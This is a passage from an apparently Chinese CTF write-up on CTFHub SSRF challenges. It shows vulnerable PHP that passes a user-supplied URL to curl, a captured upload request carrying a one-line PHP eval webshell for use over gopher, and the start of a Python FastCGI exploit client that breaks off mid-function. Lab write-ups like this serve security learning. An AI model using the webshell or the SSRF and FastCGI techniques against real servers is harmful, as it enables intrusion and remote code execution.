<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里说是如果url参数不存在则进行302跳转，如果存在呢，则在正常进行curl的http请求，而这一处代码：</p>
<p><code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</code> - 如果HTTP响应包含“Location:”重定向，那么这个选项允许cURL遵循至新的位置(重定向)。</p>
<p>那这里基本明确了，首先我们在url进行get传参的时候呢，该web服务器会自动对其中的内容进行<strong>一次编码</strong>，接着在index.php页面呢，进行了一次curl的http请求（而这个请求是我们想要的）这也就意味着我们需要进行两次编码，</p>
<p>但我看了几篇wp发现有的还进行了3次编码，这里我猜测因为他们在传参的时候首先是请求的index.php页面，之后再请求flag.php，但如果先请求index.php页面呢，这个http响应是包含location重定向的，这里与<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</code>配合会进行一次302重定向的请求，因此会增加一次url编码次数。</p>
<p>如果我们的请求直接是对flag.php进行的，那就只需要两次了</p>
<h3 id="上传文件">上传文件</h3>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
Upload Webshell

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里检查是否有一个名为“file”的文件上传到了脚本，并且这个文件的大小大于0字节。换句话说，脚本期待接收到一个文件上传。</p>
<p>这里也是懵逼了，忘记是考察gopher协议了，我还以为有什么其他伪协议有可以上传文件之类的请求呢，但却忘记了本质都是post请求。依旧使用gopher即可</p>
<p>不过这里对我来说不知道如何构造文件上传包，因此看了wp发现恍然大悟，很佩服</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222203532162.png" alt="image-20231222203532162"></p>
<p>这里我们访问指定页面会发现并没有提交按钮，但我们可以修改前端代码添加啊：</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222203852572.png" alt="image-20231222203852572"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222203848369.png" alt="image-20231222203848369"></p>
<p>接下来我们抓一个文件上传的包即可</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">306</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundary1KSttxB6ZH3HWz2e</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>

------WebKitFormBoundary1KSttxB6ZH3HWz2e
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="shell.jpg"</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/jpeg</span></span>

&lt;?php @eval($_POST[1]);?&gt;
------WebKitFormBoundary1KSttxB6ZH3HWz2e
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="hybcx"</span></span>

提交
------WebKitFormBoundary1KSttxB6ZH3HWz2e--
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用上述介绍的python代码对其进行二次url编码即可，建议上述payload的最后一行别去掉，这代表着http请求的结束标志</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222204342856.png" alt="image-20231222204342856"></p>
<h3 id="FastCGI协议">FastCGI协议</h3>
<p>这道题我看着知识面挺广的，所以这里就直接跟着文章复现，具体的原理我另起一篇文章续写</p>
<p>这里我们在理解了原理之后直接上exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> random
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>
PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
<span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>
        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> c
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">issubclass</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">return</span> s
<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>
    <span class="token comment"># private</span>
    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>
    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>
    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>
    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>
    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>
    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>
    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>
    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>
    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>
    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>
    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>
    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>
    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>
    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>
    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>
    __FCGI_HEADER_SIZE <span class="token operator">=</span> <span class="token number">8</span>
    <span class="token comment"># request state</span>
    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>
    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>
    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host
        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port
        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout
        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> <span class="token boolean">None</span>
        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment"># if self.keepalive:</span>
        <span class="token comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>
        <span class="token comment"># else:</span>
        <span class="token comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> <span class="token boolean">None</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> content
        <span class="token keyword">return</span> buf
    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        nLen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
        vLen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
        record <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value
    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
        header <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> header
    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        header <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> header<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>
            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b''</span>
            <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                contentLength <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                skiped <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> record
    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
